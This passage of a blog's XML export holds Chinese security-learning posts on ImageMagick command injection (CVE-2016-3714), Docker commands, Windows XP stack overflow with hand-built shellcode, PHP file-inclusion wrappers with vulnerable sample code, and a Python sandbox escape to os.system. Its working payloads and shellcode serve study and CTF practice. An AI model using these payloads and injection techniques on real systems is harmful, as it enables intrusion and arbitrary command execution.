:# else# $de &amp;&amp; echo &quot;XAMPP gibt es zur Zeit nur als 32-Bit Applikation. Bitte verwende eine 32-Bit Kompatibilitaetsbibliothek fuer Dein System.&quot;# $de || echo &quot;XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system.&quot;# exit# fi# ;;#esac 原理分析与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。 ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的. 在ImageMagick的默认配置文件里可以看到所有的委托：/etc/ImageMagick/delegates.xml拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。 漏洞复现ImageMagick popen_utf8命令注入 漏洞版本: ImageMagick 6.9.3-9及以下 其实就是文件名引发的命令执行。 payload : 123&lt;?phpnew Imagick('|touch /tmp/niubl');?&gt; ImageMagick 命令注入 漏洞版本: ImageMagick 6.9.3-9及以下 payload : 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://example.com/image.jpg&quot;|ls &quot;-la)&apos;pop graphic-context 将以上内容保存为test.png图片，执行convert test.png 1.png，就会执行命令。]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>linux</tag>
        <tag>imageMagick</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 基础]]></title>
    <url>%2F2016%2F11%2F22%2Fdocker%2F</url>
    <content type="text"><![CDATA[概述Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 详情创建镜像创建镜像的方法有很多，官方推荐的是直接从官网仓库pull一个，虽然官方的镜像很小，但一些基础的如ping这样的工具都没有安装，所以我选择 openvz的模板 123456# 下载模板$ wget http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64.tar.gz# 导入镜像（由于是网上找的，记得更新源）$ docker import ubuntu-14.04-x86_64.tar.gz ubuntu:base# 查看镜像$ docker images 常用指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# 进入虚拟机$ docker run -t -i ubuntu:base /bin/bash$ docker run -v /home/orleven/docker/common:/tmp -t -i orleven/base:ubuntu_14.04 /bin/bash# 后台运行容器$ Ctrl-P + Ctrl-Q# 保存容器为镜像$ docker commit -m "ubuntu_base" -a "orleven" 942 orleven/base:ubuntu_14.04# 登陆hub$ docker login -u orleven# 将某一个镜像发布到官方网站。$ docker push (镜像名:tag)# 进入容器$ docker attach 432# 运行容器$ docker start id# 下载一个ubuntu镜像$ docker pull (镜像名:tag)# 挂载文件夹 端口映射 镜像名$ docker run -v /home/orleven/docker/web1:/opt/lampp/htdocs -it -p 9001:80 ubuntu:latest$ docker run -v /home/orleven/docker/common:/tmp/ -it -p 9001:80 ubuntu# 可以列出所有安装过的镜像。$ docker images# 查看正在运行的容器$ docker ps# 查看更详细的关于某一个容器的信息。$ docker inspect efe(id 前三位)# 在learn/tutorial镜像里面安装ping程序。(必须带上y)$ docker run learn/tutorial apt-get install -y ping# 查看版本$ docker version # 搜索镜像 $ docker search 镜像名字 # 查看日志$ docker logs# 假设我们要导出的镜像名为orleven/base:ubuntu_14.04 docker save -o ubuntu14.04_base.tar.gz orleven/base:ubuntu_14.04 # 保存镜像至ubuntu14.04_base.tar.gz的文件。这需要一点时间。$ docker export f6c &gt; ./ubuntu14.04_base.tar.gz 特殊指令组合12345678910使用`docker logs`快速查看`access.log`$ docker attach 432$ tail -f access.log$ ctul + p ctul + q$ docker logs清空none$ docker ps -a | grep "Exited" | awk '&#123;print $1 &#125;'|xargs docker stop$ docker ps -a | grep "Exited" | awk '&#123;print $1 &#125;'|xargs docker rm$ docker images|grep none|awk '&#123;print $3 &#125;'|xargs docker rmi]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows XP 溢出]]></title>
    <url>%2F2016%2F11%2F10%2Fwindows-overflow-xp%2F</url>
    <content type="text"><![CDATA[概述虽然我是一只Web菜狗，还要渗透测试实习，但是怎么能不去了解逆向溢出呢。So，先了解Windows XP 溢出好了。 目标代码1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;char name[] = "abcdef";int main()&#123; char output[8]; strcpy(output, name); for(int i=0;i&lt;8&amp;&amp;output[i];i++) printf("\\0x%x",output[i]); return 0;&#125; 步骤它的运行时这样的： 假如name[] 的字符串变长 ，例如： 1char name[] = &quot;abcdefghijklmnopqrst&quot;; 就会发生溢出，vc6.0 就会报错： 可见后面的值溢出，覆盖了之后的值。 如果name[]的值是这样： 1234567891011121314151617181920212223242526char name[] = &quot;\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41&quot; //以上是覆盖掉name的8个字节以及epb个字节&quot;\x12\x45\xfa\x7f&quot; //以上是jmp esp的地址 sp3中文版的值 &quot;\x55\x8B\xEC\x33\xC0\x50\x50\x50&quot;&quot;\xC6\x45\xF4\x4D&quot;&quot;\xC6\x45\xF5\x53&quot; &quot;\xC6\x45\xF6\x56&quot; &quot;\xC6\x45\xF7\x43&quot;&quot;\xC6\x45\xF8\x52&quot;&quot;\xC6\x45\xF9\x54&quot;&quot;\xC6\x45\xFA\x2E&quot;&quot;\xC6\x45\xFB\x44&quot;&quot;\xC6\x45\xFC\x4C&quot;&quot;\xC6\x45\xFD\x4C&quot;&quot;\x8D\x45\xF4\x50\xBA\x7B\x1D\x80\x7C\xFF\xD2&quot;&quot;\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D&quot;&quot;\x89\x45\xF4\xB8\x61\x6E\x64\x2E&quot; &quot;\x89\x45\xF8\xB8\x63\x6F\x6D\x22&quot;&quot;\x89\x45\xFC\x33\xD2\x88\x55\xFF&quot;&quot;\x8D\x45\xF4\x50\xB8\xC7\x93\xBF\x77\xFF\xD0&quot;;//以上是ShellCode 则会调用cmd命令 至于jmp esp的地址是怎么来的，一般网上都有，或者。用如下程序寻找 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;windows.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #define DLL_NAME "user32.dll" int main() &#123; BYTE *ptr; int position,address; HINSTANCE handle; BOOL done_flag = FALSE; handle = LoadLibrary(DLL_NAME); if(!handle) &#123; printf("load dll error!"); exit(0); &#125; ptr = (BYTE*)handle; for(position = 0; !done_flag; position++) &#123; try &#123; if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4) &#123; int address = (int)ptr + position; printf("OPCODE found at 0x%x\n", address); &#125; &#125; catch(...) &#123; int address = (int)ptr + position; printf("END OF 0x%x\n", address); done_flag = true; &#125; &#125; return 0; &#125; 上述程序中是在user32.dll中寻找jmp esp的机器码FFE4，会查找到很多的结果，选择其中的一个就可以。这里需要特别说明的是，不同的计算机不同的操作系统版本，所找到的jmp esp的地址可能会不一样，就是说jmp esp的地址往往并不是通用的。当然，也会有几个地址是跨版本的，这个在这里不讨论。这次我们选择其中的一个地址——0x7e490b40。由于是小 端显示，所以应当在“OPQR”的位置反向书写，即400b497e。当然这里不能够直接用类似于记事本这样的软件进行编辑，而是需要用十六进制代码编辑 器操作。 至于shellcode如何得出，请继续往下看比如下面这个程序就可以完成开DOS窗口的功能，大家详细看下注释： 123456789101112#include &lt;windows.h&gt;#include &lt;winbase.h&gt;typedef void (*MYPROC)(LPTSTR); //定义函数指针int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary(“msvcrt”); ProcAdd = (MYPROC) GetProcAddress(LibHandle, "system"); //查找System函数地址 (ProcAdd) ("command.com"); //其实就是执行System(“command.com”) return 0;&#125; 程序中用GetProcAddress函数获得System的真实地址，但地址究竟是多少，如何查看呢？如下图断点，然后调试 按alt + 8 以及alt+ 5，出现如下界面 按F10 运行到如下位置 EAX变为77c293c7，说明在我的机器上System( )函数的地址是0x77c293c7。 为什么EAX就是System( )函数的地址呢？那是因为函数执行的返回值，在汇编下通常是放在EAX中的，这算是计算机系统的约定吧，所以GetProcAddress（”System”）的返回值（System函数的地址），就在EAX中，为0x77c293c7。 如下是调用cmd代码 12345678#include &lt;windows.h&gt;int main()&#123; LoadLibrary("msvcrt.dll"); system("command.com"); return 0;&#125; 首先来验证一下，在VC中可以用__asm关键字插入汇编，我们把System(“Command.com”)用我们写的汇编替换，LoadLibrary先不动，然后执行，成功！弹出了我们想要的DOS窗口。 12345678910111213141516171819202122232425262728293031#include &lt;windows.h&gt;int main()&#123; LoadLibrary("msvcrt.dll"); //system("command.com"); _asm&#123; push ebp; mov ebp, esp; xor edi,edi; push edi; //申请4字节空间 push edi; //申请4字节空间 push edi; //申请4字节空间 mov byte ptr[ebp-0ch],63h; //c mov byte ptr[ebp-0bh],6fh; //o mov byte ptr[ebp-0ah],6dh; //m mov byte ptr[ebp-09h],6dh; //m mov byte ptr[ebp-08h],61h; //a mov byte ptr[ebp-07h],6eh; //n mov byte ptr[ebp-06h],64h; //d mov byte ptr[ebp-05h],2eh; //. mov byte ptr[ebp-04h],63h; //c mov byte ptr[ebp-03h],6fh; //o mov byte ptr[ebp-02h],6dh; //m lea eax, [ebp-0ch]; push eax; //command.com串地址作为参数入栈 mov eax, 0x77c293c7; call eax; &#125; return 0;&#125; 同样的道理，LoadLibrary(“msvcrt.dll”)也仿照上面改成汇编，注意LoadLibrary可以用如下程序查找。 12345678910111213#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void (*MYPROC)(LPTSTR);int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary("kernel32"); printf("msvcrt LibHandle = //x%x\n", LibHandle); ProcAdd=(MYPROC)GetProcAddress(LibHandle,"LoadLibraryA"); printf("LoadLibrary = //x%x\n", ProcAdd); return 0;&#125; 可以看到地址为0x7c801d7b 把两段汇编合起来，将其编译、链接、执行，也成功了！ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;windows.h&gt;int main()&#123; //LoadLibrary("msvcrt.dll"); _asm&#123; push ebp; mov ebp,esp; xor eax,eax; push eax; push eax; push eax; mov byte ptr[ebp-0ch],6dh; mov byte ptr[ebp-0bh],73h; mov byte ptr[ebp-0ah],76h; mov byte ptr[ebp-09h],63h; mov byte ptr[ebp-08h],72h; mov byte ptr[ebp-07h],74h; mov byte ptr[ebp-06h],2eh; mov byte ptr[ebp-05h],64h; mov byte ptr[ebp-04h],6ch; mov byte ptr[ebp-03h],6ch; lea eax,[ebp-0ch]; push eax; mov edx, 0x7c801d7b; call edx; &#125; //system("command.com"); _asm&#123; push ebp; mov ebp, esp; xor edi,edi; push edi; push edi; push edi; mov byte ptr[ebp-0ch],63h; mov byte ptr[ebp-0bh],6fh; mov byte ptr[ebp-0ah],6dh; mov byte ptr[ebp-09h],6dh; mov byte ptr[ebp-08h],61h; mov byte ptr[ebp-07h],6eh; mov byte ptr[ebp-06h],64h; mov byte ptr[ebp-05h],2eh; mov byte ptr[ebp-04h],63h; mov byte ptr[ebp-03h],6fh; mov byte ptr[ebp-02h],6dh; lea eax, [ebp-0ch]; push eax; mov eax, 0x77c293c7; call eax; &#125; return 0;&#125; 有了上面的工作，提取ShellCode就只剩下体力活了。我们对刚才的全汇编的程序，按F10进入调试，接着按下Debug工具栏的Disassembly按钮，点右键，在弹出菜单中选中Code Bytes，就出现汇编对应的机器码。因为汇编可以完全完成我们的功能，所以我们把汇编对应的机器码原封不动抄下来，就得到我们想要的ShellCode了。 提取出来的ShellCode如下。 1234567891011unsigned char shellcode[] ="\x55\x8B\xEC\x33\xC0\x50\x50\x50""\xC6\x45\xF4\x6D\xC6\x45\xF5\x73\xC6\x45\xF6\x76\xC6\x45\xF7\x63""\xC6\x45\xF8\x72\xC6\x45\xF9\x74\xC6\x45\xFA\x2E\xC6\x45\xFB\x64\xC6\x45\xFC\x6C""\xC6\x45\xFD\x6C\x8D\x45\xF4\x50\xBA""\x7B\x1D\x80\x7C""\xFF\xD2\x55\x8B\xEC\x33\xFF\x57\x57\x57""\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D""\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E""\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8""\xC7\x93\xC2\x77""\xFF\xD0"; 最后要验证提取出来的ShellCode能否完成我们的功能。在以前的文章中已经说过方法，只需要新建一个工程和c源文件，然后把ShellCode部分拷下来，存为一个数组，最后在main中添上( (void(*)(void)) &amp;shellcode )()，如下： 1234567891011121314151617unsigned char shellcode[] ="\x55\x8B\xEC\x33\xC0\x50\x50\x50""\xC6\x45\xF4\x6D\xC6\x45\xF5\x73\xC6\x45\xF6\x76\xC6\x45\xF7\x63""\xC6\x45\xF8\x72\xC6\x45\xF9\x74\xC6\x45\xFA\x2E\xC6\x45\xFB\x64\xC6\x45\xFC\x6C""\xC6\x45\xFD\x6C\x8D\x45\xF4\x50\xBA""\x7B\x1D\x80\x7C""\xFF\xD2\x55\x8B\xEC\x33\xFF\x57\x57\x57""\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D""\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E""\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8""\xC7\x93\xC2\x77""\xFF\xD0";int main()&#123; ( (void(*)(void)) &amp;shellcode )(); return 0;&#125; ( (void(*)(void)) &amp;shellcode )()这句话是关键，它把ShellCode转换成一个参数为空，返回为空的函数指针，并调用它。执行那句就相当于执行ShellCode数组里的那些数 据。如果ShellCode正确，就会完成我们想要的功能，出现一个DOS窗口。我们亲自编写的第一个ShellCode成功完成！]]></content>
      <categories>
        <category>overflow</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>overflow</tag>
        <tag>xp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP文件包含以及部分封装协议]]></title>
    <url>%2F2016%2F10%2F31%2Fphp-RFI-LFI-protocol%2F</url>
    <content type="text"><![CDATA[概述最近总是遇到有关文件包含的问题，所以觉得有必要学习整理下有关这方面的内容。php支持的协议可以查阅官方手册。 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 这里顺便记一下有关php文件包含的函数： 12345678fopen()file_get_contents()curl_exec()readfile()require()require_once()include()include_once() PHP部分封装协议file 协议文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。 在某些函数里，例如 fopen() 和 file_get_contents()， include_path 会可选地搜索，也作为相对的路径。 123456789&lt;?php $gfile = $_GET['gfile'];if (isset($gfile))&#123; print_r(file_get_contents($gfile));&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=file://C:\mySoft\xampp\htdocs\phpinfo.php// ?gfile=file://C:/mySoft/xampp/htdocs/phpinfo.php http、https 协议允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源(需要allow_url_fopen=On并且 allow_url_include=On)。 HTTP请求会附带一个Host:头，用于兼容基于域名的虚拟主机。如果在你的 php.ini 文件中或字节流上下文（context）配置了user_agent字符串，它也会被包含在请求之中。数据流允许读取资源的 body，而 headers 则储存在了 $http_response_header 变量里。如果需要知道文档资源来自哪个 URL（经过所有重定向的处理后）， 需要处理数据流返回的系列响应报头（response headers）。 example: 12345678&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; readfile($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=http://www.example.com php 协议filterphp://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用（需要allow_url_include=On）。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。 php://filter 参数 resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 example: 1234567891011&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; readfile($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=php://filter/read=string.toupper/resource=http://www.example.com// ?gfile=php://filter/read=string.toupper|string.rot13/resource=http://www.example.com// ?gfile=php://filter/read=convert.base64-encode/resource/resource=http://www.example.com inputphp://input 是个可以访问请求的原始数据的只读流（需要allow_url_include=On）。POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充，比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=”multipart/form-data”的时候 php://input 是无效的。 example: 123&lt;?php$content = file_get_contents("php://input");echo $content; //输出name=tom&amp;age=22 zlibzlib: PHP 4.0.4 - PHP 4.2.3（仅支持带 fopencookie 的系统）compress.zlib:// 和 compress.bzip2:// PHP 4.3.0 及以上 用法： compress.zlib://file.gz compress.bzip2://file.bz2 zip://archive.zip#dir/file.txt data自 PHP 5.2.0 起 data:（» RFC 2397）数据流封装器开始有效(需要allow_url_include=On)。 example :12345678910111213&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; echo include($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=data://text/plain;base64,SSBsb3ZlIFBIUAo=// ?gfile=data://text/plain;charset=unicode,(●'◡'●)// ?gfile=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==// ?gfile=data://text/plain,&lt;?php phpinfo(); ?&gt; globglob:// — 查找匹配的文件路径模式。glob: 数据流包装器自 PHP 5.3.0 起开始有效，可绕过绕过open_basedir读写文件。 example : 12345678910111213&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; $it = new DirectoryIterator($gfile); foreach($it as $f) &#123; printf("%s: %.1FK&lt;br /&gt;", $f-&gt;getFilename(), $f-&gt;getSize()/1024); &#125;&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=glob://C:\mySoft\xampp\htdocs\*.php// ?gfile=glob://C:/mySoft/xampp/htdocs/*.php pharphar:// 数据流包装器自 PHP 5.3.0 起开始有效。PHP 归档。 123456789&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; include($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// 把php代码写入phpinfo文件，然后压缩成zip，再改后缀为.jpg// ?gfile=phar://phpinfo.jpg/phpinfo 大概就先这样把，下次有问题再添加。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>protocol</tag>
        <tag>php</tag>
        <tag>RFI</tag>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Sandbox Excape]]></title>
    <url>%2F2016%2F10%2F27%2Fpython-sandbox-excape%2F</url>
    <content type="text"><![CDATA[概述最近刚刚学习了Python Sandbox Excape，赶紧记录一下。 背景这是某个大牛的python沙盒逃逸实验的代码： 12345678910111213141516171819202122232425262728293031323334353637383940# -*- coding: utf-8 -*-# !/usr/bin/env pythonfrom __future__ import print_functionprint("Welcome to my Python sandbox! Enter commands below!")banned = [ "import", "exec", "eval", "pickle", "os", "subprocess", "kevin sucks", "input", "banned", "cry sum more", "sys"]targets = __builtins__.__dict__.keys()targets.remove('raw_input')targets.remove('print')for x in targets: # 去除所有内置函数除print raw_input del __builtins__.__dict__[x]while 1: print("&gt;&gt;&gt;", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print("No bueno") break else: # this means nobreak try: exec data except: print ("error !") 不能出现banned列表中的字符，但是需要读取flag文件内容。 方法file方法123456789&gt;&gt;&gt; [].__class__&lt;type 'list'&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type 'dict'&gt;&gt;&gt;&gt; ().__class__&lt;type 'tuple'&gt;&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;type 'object'&gt; 发现__subclasses__()里有file： 12&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;] 12345678910111213&gt;&gt;&gt; ().__class__.__base__.__subclasses__().index(file)40&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]&lt;type 'file'&gt;&gt;&gt;&gt; f=().__class__.__base__.__subclasses__()[40]&gt;&gt;&gt; f('test.txt','r').read()'this is a test!'&gt;&gt;&gt; print (f('test.txt','r').read())this is a test! os模块system同样的还有一种方法就是使用os模块来执行系统命令system，但是os被屏蔽,先找到os 12345678910111213141516&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60]&lt;class 'warnings.catch_warnings'&gt;&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys().index('linecache')25&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()[25]'linecache'&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys()['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt; 然后找system 12345678910111213141516171819&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys().index('system')79&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]&gt;&gt;&gt; a&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt;&gt;&gt;&gt; s=a.__dict__.keys()&gt;&gt;&gt; s['lseek', 'O_SEQUENTIAL', 'pathsep', 'execle', '_Environ', 'kill', 'urandom', 'execlp', 'startfile', 'umask', 'linesep', 'getpid', 'spawnve', 'devnull', 'fstat', 'getenv', 'O_CREAT', 'dup2', 'read', '__file__', 'P_OVERLAY', 'O_RDONLY', 'TMP_MAX', 'utime', 'execl', 'F_OK', '_make_stat_result', 'name', 'fsync', 'remove', 'P_NOWAITO', '_copy_reg', 'execv', 'execlpe', 'pardir', 'tempnam', 'tmpfile', 'sep', 'popen4', 'defpath', 'popen2', 'stat', 'O_APPEND', 'altsep', 'close', '_exists', '__all__', 'makedirs', 'getcwdu', 'access', 'UserDict', 'O_RDWR', 'P_WAIT', 'stat_result', 'lstat', '__builtins__', 'O_TEMPORARY', 'walk', 'getcwd', 'stat_float_times', '__name__', 'O_TRUNC', 'O_TEXT', 'SEEK_END', 'popen', 'times', 'P_NOWAIT', 'removedirs', '_pickle_statvfs_result', '_exit', '_get_exports_list', 'chmod', 'SEEK_CUR', 'path', 'open', 'putenv', 'fdopen', 'errno', 'mkdir', 'system', '_execvpe', 'rmdir', 'O_WRONLY', 'dup', 'O_NOINHERIT', '__doc__', 'curdir', 'isatty', 'execvpe', 'closerange', 'execvp', 'popen3', 'X_OK', 'O_SHORT_LIVED', 'execve', 'chdir', 'strerror', 'R_OK', 'error', 'extsep', 'rename', 'P_DETACH', 'W_OK', 'abort', 'statvfs_result', 'spawnl', 'tmpnam', '__package__', 'write', 'waitpid', 'spawnv', 'listdir', '_pickle_stat_result', 'unsetenv', 'SEEK_SET', 'spawnle', 'sys', 'O_RANDOM', 'unlink', 'O_BINARY', '_make_statvfs_result', 'O_EXCL', 'pipe', 'environ', 'renames']&gt;&gt;&gt; s=a.__dict__.keys().index('system')&gt;&gt;&gt; s79&gt;&gt;&gt; s=a.__dict__.keys()[79]&gt;&gt;&gt; s'system' 读取文件 123456789101112131415&gt;&gt;&gt; s=a.__dict__.values()[79]&gt;&gt;&gt; s&lt;built-in function system&gt;&gt;&gt;&gt; s('dir') 驱动器 C 中的卷是 WIN 7 卷的序列号是 28DD-3D6F C:\Users\Administrator\Desktop 的目录2016/10/24 周一 上午 10:19 &lt;DIR&gt; .2016/10/24 周一 上午 10:19 &lt;DIR&gt; ..2016/10/24 周一 上午 10:19 15 test.txt&gt;&gt;&gt; s('type test.txt')this is a test!0 或者像下面一样： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&gt;&gt;&gt; print (().__class__)&lt;type 'tuple'&gt;&gt;&gt;&gt; print (().__class__.__base__)&lt;type 'object'&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__)&lt;built-in method __subclasses__ of type object at 0x1E229708&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__())[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, 